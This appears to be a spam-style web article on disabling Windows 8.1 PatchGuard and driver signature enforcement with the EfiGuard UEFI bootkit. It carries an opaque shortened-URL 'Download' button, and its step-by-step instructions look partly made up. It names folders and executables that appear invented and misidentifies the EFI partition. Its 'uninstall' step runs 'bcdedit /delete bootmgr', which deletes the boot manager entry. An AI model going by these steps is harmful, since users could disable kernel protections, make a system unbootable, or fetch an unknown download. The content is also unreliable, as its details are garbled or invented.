## How to Disable Patchguard and Driver Signature Enforcement on Windows 8.1

 
![Disable Patchguard Windows 81](https://github.githubassets.com/images/modules/open_graph/github-logo.png)

 
# How to Disable Patchguard and Driver Signature Enforcement on Windows 8.1
 
Patchguard is a feature of Windows that prevents unauthorized modifications to the kernel code, such as rootkits or malware. Driver Signature Enforcement (DSE) is another feature that requires drivers to be digitally signed by Microsoft or a trusted authority, in order to prevent loading of malicious or incompatible drivers.
 
## Disable Patchguard Windows 81


[**Download**](https://www.google.com/url?q=https%3A%2F%2Fgeags.com%2F2tLjFT&sa=D&sntz=1&usg=AOvVaw1xUBFlFMSKd9U5MRrfYf3Q)

 
While these features are designed to enhance the security and stability of Windows, they can also interfere with some legitimate scenarios, such as debugging, testing, or using custom drivers. In this article, we will show you how to disable Patchguard and DSE on Windows 8.1 using a UEFI bootkit called EfiGuard.
 
## What is EfiGuard?
 
EfiGuard is a portable x64 UEFI bootkit that patches the Windows boot manager, boot loader and kernel at boot time in order to disable Patchguard and DSE. It supports all EFI-compatible versions of Windows x64 ever released, from Vista SP1 to Windows 11. It is easy to use: it can be booted from a USB stick or the Windows EFI partition via a loader that automatically finds and boots Windows. It works passively: it does not load or start the Windows boot manager, but instead acts on a load of bootmgfw.efi by the firmware boot manager. If a non-Windows OS is booted, the driver will automatically unload itself. It also has graceful recovery and debuggable features. You can find more details and source code on its GitHub page[^1^].
 
## How to use EfiGuard?
 
To use EfiGuard, you need to have a UEFI-compatible system with SecureBoot disabled. You also need administrative privileges on Windows. Here are the steps:
 
1. Download the latest release of EfiGuard from its GitHub page[^1^] and extract it to a folder.
2. Copy the folder EfiGuardDxe to the root of your USB stick or Windows EFI partition (usually C:\Windows\Boot\EFI).
3. Run patch.exe as administrator from the folder Application Loader. This will create a new boot entry called "EfiGuard" in your firmware boot menu.
4. Reboot your system and select "EfiGuard" from the boot menu. This will load EfiGuard and then boot Windows normally.
5. You can verify that Patchguard and DSE are disabled by running test\_signing\_on.exe or test\_pg\_off.exe from the folder tests.

## How to uninstall EfiGuard?
 
To uninstall EfiGuard, you need to do the following:

1. In an elevated command prompt, type `bcdedit /delete bootmgr /store C:\EFI\Microsoft\Boot\BCD`. This will delete the EfiGuard boot entry.
2. Delete the folder EfiGuardDxe from your USB stick or Windows EFI partition.

## Conclusion
 
In this article, we showed you how to disable Patchguard and DSE on Windows 8.1 using EfiGuard, a UEFI bootkit that patches the Windows boot process. This can be useful for debugging, testing, or using custom drivers on Windows. However, you should be aware of the risks involved in disabling these security features, as they can expose your system to potential threats. Use EfiGuard at your own risk and only for legitimate purposes.
 0f148eb4a0
